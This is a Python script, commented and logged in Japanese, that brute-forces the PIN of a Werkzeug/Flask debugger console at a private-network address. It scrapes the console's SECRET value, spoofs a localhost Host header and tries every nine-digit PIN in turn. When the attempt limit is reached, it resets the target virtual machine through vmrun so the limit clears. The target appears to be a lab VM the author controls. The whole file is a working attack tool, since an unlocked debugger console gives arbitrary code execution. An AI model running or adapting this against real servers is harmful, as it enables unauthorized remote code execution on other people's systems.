import requests
import json
from requests.exceptions import RequestException
import re
import subprocess
import os
import time
import logging 

# --- 設定 ---
LOG_FILE = 'pin_bruteforce.log'
TARGET_URL = 'http://192.168.126.130:3000/console'
SECRET_VALUE = '' 
headers = {
    "Host": "localhost"
}
VMRUN_PATH = "" 
VMX_PATH = "" 
# --------------------

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# --------------------

def get_secret():
    global SECRET_VALUE
    logger.info("--- SECRET値の取得を開始 ---")
    try:
        response = requests.post(TARGET_URL, headers=headers, timeout=10)
        response.raise_for_status()
        
        html_content = response.text
        pattern = r'SECRET\s*=\s*"([^"]+)"'
        match = re.search(pattern, html_content)

        if match:
            SECRET_VALUE = match.group(1)
            logger.info(f"✅ SECRETの値を取得しました: {SECRET_VALUE}")
            return True
        else:
            logger.error("❌ SECRETの値が見つかりませんでした。")
            return False

    except requests.exceptions.RequestException as e:
        logger.error(f"リクエストエラーが発生しました: {e}")
        return False
    except Exception as e:
        logger.error(f"予期せぬエラー: {e}")
        return False


def reboot_vm_with_vmrun(vmrun_path, vmx_path):
    if not os.path.exists(vmrun_path) or not os.path.exists(vmx_path):
        logger.error(f"❌ エラー: パスを確認してください。vmrun: {os.path.exists(vmrun_path)}, vmx: {os.path.exists(vmx_path)}")
        return False

    command = [vmrun_path, "-T", "ws", "reset", vmx_path]
    logger.info(f"\n--- VM再起動処理 ---")
    logger.info(f"VM: {os.path.basename(vmx_path)} の再起動 (reset) を試行...")

    try:
        result = subprocess.run(
            command, 
            capture_output=True,
            text=True,
            check=False
        )
        
        if result.returncode == 0:
            logger.info(f"✅ コマンド実行成功。VMの再起動リクエストを送信しました。")
        else:
            logger.warning(f"⚠️ vmrunコマンドはエラーコード {result.returncode} で終了しました。")
            # vmrunの標準エラー出力もログに記録
            logger.warning(f"STDERR:\n{result.stderr.strip()}")
            
        logger.info("💡 VMが起動を完了するまで30秒間待機します...")
        time.sleep(25)
        logger.info("--------------------")
        return True

    except Exception as e:
        logger.error(f"❌ vmrun実行中の予期せぬエラー: {e}")
        return False


# --- メイン実行部 ---

if not get_secret():
    exit()

BASE_URL = f"{TARGET_URL}?__debugger__=yes&cmd=pinauth&s={SECRET_VALUE}&pin="

#Start PIN number
current_pin_num = 100000000
MAX_PIN = 999999999 

while current_pin_num <= MAX_PIN:
    
    # PINのフォーマット
    pin_str_formatted = f"{current_pin_num:09d}"
    pin_formatted = f"{pin_str_formatted[:3]}-{pin_str_formatted[3:6]}-{pin_str_formatted[6:]}"
    request_url = BASE_URL + pin_formatted

    logger.info("-------------------------------------------------")
    logger.info(f"[{current_pin_num:09d}] 試行PIN: {pin_formatted}")
    
    try:
        response = requests.get(request_url, headers=headers, timeout=20)
        response.raise_for_status()
        data = response.json()

        auth_status = data.get("auth", False)
        exhausted_status = data.get("exhausted", False)
        
        if auth_status:
            logger.critical(f" 🎉 認証成功!! PINコードが見つかりました: {pin_formatted}")
            break
            
        elif exhausted_status:
            logger.warning(f" ⚠️ exhausted: True (試行回数上限に達しました) - PIN: {pin_formatted}")
            logger.info(" VMを再起動して、カウンターのリセットを試みます。")
            
            if reboot_vm_with_vmrun(VMRUN_PATH, VMX_PATH):
                # VM再起動後、SECRETがリセットされる可能性を考慮し、再取得
                get_secret()
                # 新しいSECRET_VALUEでBASE_URLを再構築
                BASE_URL = f"{TARGET_URL}?__debugger__=yes&cmd=pinauth&s={SECRET_VALUE}&pin="
                # 同じPINを再試行するため、current_pin_numはインクリメントしない
                continue
            else:
                logger.critical(" ❌ 再起動に失敗しました。プログラムを終了します。")
                break
        
        else:
            # 認証失敗 (auth: False, exhausted: False)
            logger.info(f" ❌ 認証失敗。次のPINに進みます。")
            current_pin_num += 1

    except RequestException as e:
        logger.error(f" ❌ エラー: 通信失敗またはタイムアウト: {e} - PIN: {pin_formatted}")
        logger.info(" ネットワークまたはターゲットに問題がある可能性があります。次のPINに進みます。")
        current_pin_num += 1
    
    except json.JSONDecodeError:
        logger.error(f" ❌ エラー: レスポンスがJSON形式ではありませんでした。次のPINに進みます。 - PIN: {pin_formatted}")
        current_pin_num += 1


logger.info("-------------------------------------------------")
if current_pin_num > MAX_PIN:
    logger.info("全PIN試行が完了しました。")
else:
    logger.info("PINが見つかりました。または、プログラムを中断しました。")